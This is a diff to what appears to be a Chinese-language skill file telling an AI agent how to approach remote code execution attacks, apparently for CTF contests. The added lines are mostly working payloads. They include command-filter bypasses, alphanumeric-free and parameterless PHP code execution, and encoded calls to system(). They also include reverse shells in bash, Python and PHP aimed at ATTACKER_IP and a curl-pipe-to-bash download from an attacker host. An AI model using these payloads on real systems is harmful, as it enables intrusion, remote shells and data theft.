@@ -49,12 +49,64 @@ description: Use when encountering rce攻击思维链 - 文件上传、命令注
 - DNS外带: 通过子域名带出数据
 - HTTP外带: 通过请求带出数据
 
-**绕过空格**: `$IFS` `${IFS}` 重定向符号
+**绕过空格**: `$IFS` `${IFS}` 重定向符号 `<` `${IFS}$9`
 
 **绕过关键字**:
-- 变量拼接
-- 编码绕过(Base64/Hex)
-- 通配符替代
+- 变量拼接: `a=f&&b=lag&&cat $a$b`
+- 编码绕过(Base64/Hex): `echo "Y2F0IGZsYWc="| base64 -d | bash`
+- 通配符替代: `cat f*` `cat f???` `cat fla[f-h]`
+- 引号分割: `cat'' fl''ag` `ca\t fl\ag`
+- `$@` 分割: `cat$@t fl$@ag`
+- 八进制: `cat $'\146\154\141\147'`
+- xxd 十六进制: `echo "63617420666c6167" | xxd -r -p | bash`
+- `/` 绕过: `echo ${PATH:0:1}` 获取 `/`
+
+**无数字字母 RCE（PHP）**:
+```php
+// 自增法（PHP < 8.3）
+$_=[]._;$_=$_[_];$_++; // A->B->C...
+// 构造 payload: _$__(POST[_])  → system('cat /f*')
+```
+
+**无参数 RCE（PHP）**:
+```php
+// 列目录
+scandir(current(localeconv()))
+var_dump(scandir(dirname(getcwd())))  // 上级目录
+
+// 读文件
+highlight_file(array_rand(array_flip(scandir(getcwd()))))
+
+// Header 注入
+end(getallheaders())
+
+// Session ID 执行
+eval(hex2bin(session_id(session_start())))
+
+// 变量定义
+get_defined_vars()  // 获取最后一个变量
+```
+
+**无回显 RCE**:
+```bash
+# tee 写入文件
+ls / | tee 1.txt
+# cp 复制
+cp /flag .
+cp /f* /dev/stdout
+```
+
+**PHP 编码绕过**:
+```php
+// 十六进制
+("\x70\x68\x70\x69\x6e\x66\x6f")();  // phpinfo()
+
+// 八进制
+"\163\171\163\164\145\155"('id');    // system('id')
+
+// Unicode
+"\u{73}\u{79}\u{73}\u{74}\u{65}\u{6d}"('id');
+```
 
 ---
 
@@ -91,14 +143,60 @@ description: Use when encountering rce攻击思维链 - 文件上传、命令注
 
 ## 反向连接方式
 
-各语言都有对应的反向连接方法:
-- Bash: 使用tcp重定向
-- Python: socket + subprocess
-- PHP: fsockopen + exec
-- Perl: socket + open
-- NC: -e参数或管道
+### 检测方法
+```bash
+whereis nc bash python php exec lua perl ruby
+# 确定目标支持的反弹方法
+```
 
-**注意**: 目标需有出网能力
+### Bash 反弹（最常用）
+```bash
+# 攻击者监听
+nc -lvp 9999
+
+# 受害者执行
+bash -c "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"
+```
+
+### Python 反弹
+```bash
+# 攻击者监听
+nc -lvp 7777
+
+# 受害者执行
+python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ATTACKER_IP',7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
+```
+
+### PHP 反弹
+```bash
+php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+
+### curl 下载执行
+```bash
+curl http://ATTACKER_IP/shell.sh | bash
+```
+
+### NC 参数说明
+- `-l` 监听模式，用于入站连接
+- `-v` 详细输出（两个-v更详细）
+- `-p port` 本地端口号
+
+### NAT/防火墙绕过
+
+| 障碍 | 解决方案 |
+|------|----------|
+| NAT | 端口转发 / 中转服务器 / frp |
+| 防火墙 | 使用中转服务器（VPS监听） |
+
+**推荐方案（比赛环境）**:
+```bash
+# Kali 上监听
+nc -lvp 4444
+# 目标反弹到 Kali IP:4444
+```
+
+**注意**: 比赛环境通常不能出网，反弹 shell 到本地 Kali 即可。
 
 ---
 
